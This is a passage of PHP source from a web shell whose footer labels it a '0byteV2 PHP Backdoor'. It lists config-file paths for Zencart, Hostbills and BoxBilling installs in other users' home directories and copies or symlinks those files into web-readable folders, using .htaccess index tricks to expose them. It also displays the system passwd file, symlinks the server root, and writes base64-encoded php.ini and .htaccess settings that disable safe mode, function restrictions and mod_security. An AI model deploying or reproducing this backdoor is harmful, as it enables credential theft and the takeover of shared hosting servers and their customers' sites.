"/home/$user_brudul/public_html/support/order/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/includes/dist-configure.php" => "Zencart",
"/home/$user_brudul/public_html/zencart/includes/dist-configure.php" => "Zencart",
"/home/$user_brudul/public_html/products/includes/dist-configure.php" => "Zencart",
"/home/$user_brudul/public_html/cart/includes/dist-configure.php" => "Zencart",
"/home/$user_brudul/public_html/shop/includes/dist-configure.php" => "Zencart",
"/home/$user_brudul/public_html/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/hostbills/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/host/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/Host/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/supportes/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/support/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/hosting/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/cart/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/order/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/client/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/clients/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/cliente/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/clientes/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/billing/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/billings/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/my/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/secure/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/support/order/includes/iso4217.php" => "Hostbills"
);
foreach($grab_config as $config => $nama_config) {
if($_POST['config'] == 'grab') {
$ambil_config = file_get_contents($config);
if($ambil_config == '') {
} else {
$file_config = fopen("brudul_configgrab/$user_brudul-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
if($_POST['config'] == 'symlink') {
@symlink($config,"brudul_Symconfig/".$user_brudul."-".$nama_config.".txt");
}
if($_POST['config'] == '404') {
$sym404=symlink($config,"brudul_sym404/".$user_brudul."-".$nama_config.".txt");
if($sym404){
@mkdir("brudul_sym404/".$user_brudul."-".$nama_config.".txt404", 0777);
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
HeaderName Brudul.txt
Satisfy Any
IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
IndexIgnore *";
@file_put_contents("brudul_sym404/".$user_brudul."-".$nama_config.".txt404/.htaccess",$htaccess);
@symlink($config,"brudul_sym404/".$user_brudul."-".$nama_config.".txt404/Brudul.txt");
}
}
}
}  if($_POST['config'] == 'grab') {
echo "<center><a href='?path=$offdir/brudul_configgrab'><font color=lime>Done</font></a></center>";
}
if($_POST['config'] == '404') {
echo "<center>
<a href=\"brudul_sym404/root/\">SymlinkNya</a>
<br><a href=\"brudul_sym404/\">Configurations</a></center>";
}
if($_POST['config'] == 'symlink') {
echo "<center>
<a href=\"brudul_symconfig/root/\">Symlinknya</a>
<br><a href=\"brudul_symconfig/\">Configurations</a></center>";
}
if($_POST['config'] == 'symvhost') {
echo "<center>
<a href=\"brudul_symvhost/root/\">Root Server</a>
<br><a href=\"brudul_symvhost/\">Configurations</a></center>";
}


} else{
echo "<center><form method=\"post\" action=\"\"><center>
</center></select><br><textarea class=\"txarea\" name=\"passwd\" style=\"height: 450px;width: 100%;resize: none;\">";
echo getpasswd();
echo "</textarea>";
echo "<br><br>
<select class=\"select\" name=\"config\"  style=\"width: 450px;\" height=\"10\">
<option value=\"grab\">Config Grab</option>
<option value=\"symlink\">Symlink Config</option>
<option value=\"404\">Config 404</option>
<option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center><br>";
}
}
echo '<br /><form method=post><input type="submit" name="bypastod" value="Bypass Root Path With System Function"/></form>';
if($_POST['bypastod']){
mkdir('monkey', 0755);
chdir('monkey');
exect('ln -s / XmonkeyX');
$htaccess ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
symlink("/","XmonkeyX");
$Boom="<br><a href=monkey/XmonkeyX TARGET='_blank'><b>Crotz Here!</b></a>";
echo "<center>$Boom</center>";
}
$phpini = 'c2FmZV9tb2RlID0gT0ZGCmRpc2FibGVfZnVuY3Rpb25zID0gTk9ORQ==';
$bysafe = 'PElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPgogICBTZWNGaWx0ZXJFbmdpbmUgT2ZmCiAgIFNlY0ZpbHRlclNjYW5QT1NUIE9mZgo8L0lmTW9kdWxlPg==';
echo '<br /><form method=post><input type="submit" name="gosss" value="Bypass Safe Mode & Disable Func"/></form>';
if($_POST['gosss']){
	$ntot = fopen('php.ini', w);
	fwrite($ntot, base64_decode($phpini));
	fclose($ntot);
	$ntot2 = fopen('.htaccess', w);
	fwrite($ntot2, base64_decode($bysafe));
	fclose($ntot2);
}
echo '<div class="footer"> 0byteV2 PHP Backdoor &copy; 2018 - '.eof().' </div></div>';
?>